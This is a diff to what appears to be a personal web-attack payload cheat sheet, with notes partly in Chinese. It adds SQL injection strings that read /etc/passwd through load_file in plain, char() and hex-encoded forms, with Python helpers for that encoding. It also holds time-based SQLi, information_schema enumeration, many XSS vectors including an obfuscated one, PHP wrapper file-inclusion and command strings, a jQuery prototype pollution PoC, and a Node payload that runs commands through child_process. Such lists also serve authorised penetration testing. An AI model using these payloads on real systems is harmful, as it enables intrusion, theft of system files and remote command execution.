@@ -24,8 +24,18 @@ XSS + 原形污染PoC
 
 SQLi
 ' or 1 or '
-' and sleep(10)-- -
+' or sleep(10)-- -
 ';WAITFOR DELAY '0:0:10'-- -
+(select count(*) from mysql.user)>0
+load_file('/etc/passwd')
+load_file(char(47,101,116,99,47,112,97,115,115,119,100))
+load_file(0x2f6574632f706173737764)
+
+# ascii
+print(*[ord(i) for i in input('str:')], sep='')
+
+# hex
+print(*[hex(ord(i))[2:] for i in input('str:')], sep='')
 
 (select group_concat(schema_name) from information_schema.schemata)
 基於boolean測試
@@ -68,7 +78,6 @@ store xss
 
 
 onscroll=alert(26)
-"><!--
 
 "><a href=javascript:alert(1)>xss</a>
 </html></body></script></a></tr></head></div></tr></td></table>
@@ -77,9 +86,6 @@ onscroll=alert(26)
 "><svg/onload=alert(1)>
 "><svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
 "><svg/onload=alert('XSS')>
-
-"><img src=1 onerror=$.extend(true,{},JSON.parse('{"__proto__":{"z":"XSS"}}'));alert(z)>
-
 
 "><img src=1 onerror=alert(1)>
 "><img src=1 onmouseover=alert(1)>
@@ -139,16 +145,12 @@ php://input&cmd=ls
 php://filter
 expect://ls
 
-
 printenv.pl的XSS payload
 http://[target]/cgi-bin/printenv/href="bad"
 http://[target]/cgi-bin/printenv.pl?acuparam=>"><ScRiPt>alert(1)</ScRiPt>
-
 
 原形污染PoC
 // jquery 3.4.0版本以前都有效
 $.extend(true, {}, JSON.parse('{"__proto__": {"z": 123}}'));console.log(z);
 
 {"z":"return global.process.mainModule.constructor._load('child_process').execSync('ls');}
-
-
